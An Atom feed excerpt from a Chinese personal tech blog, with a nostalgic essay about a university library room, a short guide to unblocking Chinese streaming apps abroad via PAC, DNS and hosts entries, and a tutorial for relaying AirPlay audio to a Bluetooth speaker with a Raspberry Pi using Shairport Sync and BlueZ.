rel="external">http://blog.csdn.net/u013431550/article/details/40870947</a><br><a href="http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba" target="_blank" rel="external">http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba</a><br><a href="http://blog.csdn.net/longerzone/article/details/36171381" target="_blank" rel="external">http://blog.csdn.net/longerzone/article/details/36171381</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。&lt;/p&gt;
&lt;p&gt;在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。&lt;br&gt;
    
    </summary>
    
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/tags/Raspberry/"/>
    
  </entry>
  
  <entry>
    <title>我怀念的依旧是916</title>
    <link href="http://blog.yfgeek.com/2016/08/20/916/"/>
    <id>http://blog.yfgeek.com/2016/08/20/916/</id>
    <published>2016-08-20T22:22:01.000Z</published>
    <updated>2016-08-21T00:09:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。</p>
<p>所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。</p>
<p>916桌子很多，却都是空位，但是有基友陪伴。<br><a id="more"></a><br><img src="/content/images/2016/08/IMG_0052.JPG" alt=""></p>
<p>916有dong dong dong，充满回忆。<br><img src="/content/images/2016/08/IMG_0310.JPG" alt=""><br><img src="/content/images/2016/08/IMG_0798.JPG" alt=""></p>
<p>916从来不用占座，却可以假装学习。<br><img src="/content/images/2016/08/IMG_1133.JPG" alt=""><br><img src="/content/images/2016/08/IMG_1131.JPG" alt=""></p>
<p>916通宵加零食，空调WI-FI感觉人生圆满了。<br><img src="/content/images/2016/08/IMG_0912.JPG" alt=""></p>
<p>916有沙发有地铺，住在学校里的快捷酒店。<br><img src="/content/images/2016/08/IMG_0459.JPG" alt=""></p>
<p>916极大地方便了生活，Linux的帮忙少不了。<br><img src="/content/images/2016/08/IMG_0502-1.JPG" alt=""></p>
<p>或许我想念的并不是不太优越的办公环境，而是那种感觉。</p>
<p>炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。</p>
<p>自由自在，想做什么做什么。</p>
<p>当然，我也不会忘记，</p>
<p>偷偷的把被子塞到书包里，绕过防火墙的经历；</p>
<p>第二天起床去厕所刷牙碰到老师，被吓住的心情；</p>
<p>晚上十一点半有人巡查，关闭所有光源，假装没人的感觉；</p>
<p>十点后进入害怕遇到搜查，爬九楼的故事；</p>
<p>隔壁传来的dongdongdong声音和30GB的故事。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。&lt;/p&gt;
&lt;p&gt;所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。&lt;/p&gt;
&lt;p&gt;916桌子很多，却都是空位，但是有基友陪伴。&lt;br&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://blog.yfgeek.com/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>海外App生存指南</title>
    <link href="http://blog.yfgeek.com/2016/08/12/hai-wai-appsheng-cun-zhi-nan/"/>
    <id>http://blog.yfgeek.com/2016/08/12/hai-wai-appsheng-cun-zhi-nan/</id>
    <published>2016-08-12T22:13:34.000Z</published>
    <updated>2016-08-12T22:30:50.000Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a> 
<h1 id="DNS-PAC大法"><a href="#DNS-PAC大法" class="headerlink" title="DNS/PAC大法"></a>DNS/PAC大法</h1><h2 id="优酷土豆爱奇艺"><a href="#优酷土豆爱奇艺" class="headerlink" title="优酷土豆爱奇艺"></a>优酷土豆爱奇艺</h2><p>在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://pac.uku.im/pac.pac</div></pre></td></tr></table></figure></p>
<p>DNS:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">158.69.209.100</div></pre></td></tr></table></figure></p>
<p>更新：<a href="https://github.com/uku/Unblock-Youku/issues/618" target="_blank" rel="external">https://github.com/uku/Unblock-Youku/issues/618</a></p>
<h1 id="替换hosts大法"><a href="#替换hosts大法" class="headerlink" title="替换hosts大法"></a>替换hosts大法</h1><h2 id="网易云音乐"><a href="#网易云音乐" class="headerlink" title="网易云音乐"></a>网易云音乐</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">104.236.189.178 http://music.163.com </div><div class="line">198.47.104.134 http://m1.music.126.net </div><div class="line">198.47.104.134 http://m2.music.126.net </div><div class="line">198.47.104.134 http://m3.music.126.net </div><div class="line">198.47.104.134 http://m4.music.126.net</div><div class="line">198.47.104.134 http://m5.music.126.net </div><div class="line">198.47.104.134 http://m6.music.126.net </div><div class="line">198.47.104.134 http://m7.music.126.net </div><div class="line">198.47.104.134 http://m8.music.126.net </div><div class="line">198.47.104.134 http://m9.music.126.net </div><div class="line">198.47.104.134 http://m10.music.126.net</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;a id=&quot;more&quot;&gt;&lt;/a&gt; 
&lt;h1 id=&quot;DNS-PAC大法&quot;&gt;&lt;a href=&quot;#DNS-PAC大法&quot; class=&quot;headerlink&quot; title=&quot;DNS/PAC大法&quot;&gt;&lt;/a&gt;DNS/PAC大法&lt;/h1&gt;&lt;h2 id=&quot;优酷土豆爱奇艺&quot;&gt;&lt;a href=&quot;
    
    </summary>
    
    
      <category term="其他" scheme="http://blog.yfgeek.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>用树莓派把蓝牙音响变成Airplay音响</title>
    <link href="http://blog.yfgeek.com/2016/08/07/airplay/"/>
    <id>http://blog.yfgeek.com/2016/08/07/airplay/</id>
    <published>2016-08-07T20:23:56.000Z</published>
    <updated>2016-08-07T22:28:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。<br>于是萌生了一个想法，正好手上有个树莓派，能不能这样：</p>
<blockquote>
<p>iOS设备-&gt;Airplay-&gt;树莓派-&gt;蓝牙-&gt;小米蓝牙音箱<br><a id="more"></a><br><img src="/content/images/2016/08/DSC07326-5.JPG" alt=""></p>
</blockquote>
<p>因此这个问题可以分为两个部分：</p>
<ul>
<li>1.树莓派蓝牙音频配置部分</li>
<li>2.树莓派Airplay播放部分</li>
</ul>
<p>在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。</p>
<h1 id="原料"><a href="#原料" class="headerlink" title="原料"></a>原料</h1><ul>
<li>树莓派3</li>
<li>小米蓝牙音箱</li>
<li>iOS设备</li>
</ul>
<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="树莓派安装Shairport-Sync"><a href="#树莓派安装Shairport-Sync" class="headerlink" title="树莓派安装Shairport Sync"></a>树莓派安装Shairport Sync</h2><p>Shairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。<br>安装前请确认是否安装以下依赖包：</p>
<ul>
<li><code>apt-get install build-essential git</code></li>
<li><code>apt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev</code></li>
<li><code>apt-get install avahi-daemon libavahi-client-dev</code> </li>
<li><code>apt-get install libssl-dev</code> </li>
<li><code>apt-get install libpolarssl-dev</code> </li>
<li><code>apt-get install libsoxr-dev</code> </li>
</ul>
<p>随后下载Shairport Sync：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/mikebrady/shairport-sync.git</div></pre></td></tr></table></figure></p>
<p>然后<code>cd</code>到相应目录，执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">autoreconf -i <span class="_">-f</span></div></pre></td></tr></table></figure></p>
<p>随后执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd</div></pre></td></tr></table></figure></p>
<p>如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">make</div></pre></td></tr></table></figure></p>
<p>创建开机启动：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">getent group shairport-sync &amp;&gt;/dev/null || sudo groupadd -r shairport-sync &gt;/dev/null</div><div class="line"></div><div class="line">getent passwd shairport-sync &amp;&gt; /dev/null || sudo useradd -r -M -g shairport-sync <span class="_">-s</span> /usr/bin/nologin -G audio shairport-sync &gt;/dev/null</div></pre></td></tr></table></figure></p>
<p>然后运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo make install</div></pre></td></tr></table></figure></p>
<p>最后输入，完成安装：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo update-rc.d shairport-sync defaults 90 10</div></pre></td></tr></table></figure></p>
<h2 id="树莓派安装蓝牙"><a href="#树莓派安装蓝牙" class="headerlink" title="树莓派安装蓝牙"></a>树莓派安装蓝牙</h2><p>打开终端，用普通用户权限执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get updgrade -y</div><div class="line">sudo apt-get dist-upgrade -y</div></pre></td></tr></table></figure></p>
<p>随后安装蓝牙及管理软件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install pi-bluetooth bluez bluez-firmware blueman</div></pre></td></tr></table></figure></p>
<p>将pi用户添加到蓝牙组<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo usermod -G bluetooth <span class="_">-a</span> pi</div></pre></td></tr></table></figure></p>
<p>还有很<strong>重要</strong>的一条，安装蓝牙音频配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install pulseaudio pulseaudio-module-bluetooth</div></pre></td></tr></table></figure></p>
<p>随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。<br>也可通过bluetoothctl或hictool命令进行配对。<br>随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。</p>
<p><strong>在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。</strong></p>
<h2 id="配置蓝牙音频及Shariport-Sync"><a href="#配置蓝牙音频及Shariport-Sync" class="headerlink" title="配置蓝牙音频及Shariport Sync"></a>配置蓝牙音频及Shariport Sync</h2><p>安装依赖包：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install libdbus-1-dev</div><div class="line">sudo apt-get install libglib2.0-dev</div><div class="line">apt-cache search libasound</div><div class="line">sudo apt-get install libasound2-dev</div></pre></td></tr></table></figure></p>
<p>配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xz</div><div class="line">tar -xvf bluez-4.101.tar.xz</div><div class="line"><span class="built_in">cd</span> bluez-4.101</div><div class="line">./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/lib</div><div class="line">make</div><div class="line">sudo make install</div></pre></td></tr></table></figure></p>
<p>复制配置文件到目录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo cp /home/pi/bluez-4.101/<span class="built_in">test</span>/simple-agent /usr/bin/bluez-simple-agent</div><div class="line">sudo cp /home/pi/bluez-4.101/<span class="built_in">test</span>/<span class="built_in">test</span>-device /usr/bin/bluez-test-device</div><div class="line">sudo cp /home/pi/bluez-4.101/<span class="built_in">test</span>/<span class="built_in">test</span>-audio /usr/bin/bluez-test-audio</div><div class="line">sudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/</div></pre></td></tr></table></figure></p>
<p>接着运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install python-dbus</div><div class="line">sudo apt-get install python-gobject</div><div class="line">sudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/</div></pre></td></tr></table></figure></p>
<p>编辑audio.conf文件使shariport的音频从蓝牙设备输出：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo nano /etc/bluetooth/audio.conf</div></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 在[General]区域添加:</span></div><div class="line">Enable=Sink,Socket</div><div class="line"><span class="comment"># 取消[A2DP]注释，并加入:</span></div><div class="line">Maxconnections=4</div></pre></td></tr></table></figure>
<p>打开蓝牙自启动:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo systemctl <span class="built_in">enable</span> bluetooth</div></pre></td></tr></table></figure></p>
<p>重启设备后，继续配置，打开asund.conf文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo nano /etc/asound.conf</div></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">pcm.bt_canz &#123;</div><div class="line">type plug</div><div class="line">slave &#123;</div><div class="line">pcm &#123;</div><div class="line">type bluetooth</div><div class="line">device XX:XX:XX:XX:XX:XX</div><div class="line">profile <span class="string">"auto"</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">hint &#123;</div><div class="line">show on</div><div class="line">description <span class="string">"Mi Speaker"</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">ctl.bt_canz &#123;</div><div class="line">type bluetooth</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>测试bluez能否使用：<code>sudo bluez-simple-agent</code>，如果正常，按ctrl+c停止。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XX</div><div class="line">sudo bluez-test-audio connect XX:XX:XX:XX:XX:XX</div></pre></td></tr></table></figure></p>
<p>测试是否连通：<code>speaker-test -c 2 -D bt_canz</code></p>
<p>再次重启设备。<br>开启后编辑<code>/etc/shairport-sync.conf</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo nano /etc/shairport-sync.conf</div><div class="line"><span class="comment">#去掉下面的注释，并加入bt_canz</span></div><div class="line">output_device = bt_canz</div></pre></td></tr></table></figure></p>
<p>保存！重启！开机即可用。<br><img src="/content/images/2016/08/IMG_0635.PNG" alt=""></p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://github.com/mikebrady/shairport-sync/issues/200" target="_blank" rel="external">https://github.com/mikebrady/shairport-sync/issues/200</a><br><a href="https://github.com/mikebrady/shairport-sync" target="_blank" rel="external">https://github.com/mikebrady/shairport-sync</a><br><a href="http://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html" target="_blank" rel="external">http://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html</a><br><a href="http://wangye.org/blog/archives/921/" target="_blank" rel="external">http://wangye.org/blog/archives/921/</a><br><a href="http://blog.csdn.net/huayucong/article/details/51376461" target="_blank" rel="external">http://blog.csdn.net/huayucong/article/details/51376461</a><br><a href="http://blog.csdn.net/zhaoqi_0612/article/details/47731821" target="_blank" rel="external">http://blog.csdn.net/zhaoqi_0612/article/details/47731821</a><br><a href="http://blog.csdn.net/techtitan/article/details/6165116" target="_blank" rel="external">http://blog.csdn.net/techtitan/article/details/6165116</a><br><a href="http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1" target="_blank" rel="external">http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。&lt;br&gt;于是萌生了一个想法，正好手上有个树莓派，能不能这样：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;iOS设备-&amp;gt;Airplay-&amp;gt;树莓派-&amp;gt;蓝牙-&amp;gt;小米蓝牙音箱&lt;br&gt;
    
    </summary>
    
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/tags/Raspberry/"/>
    
  </entry>
  
</feed>
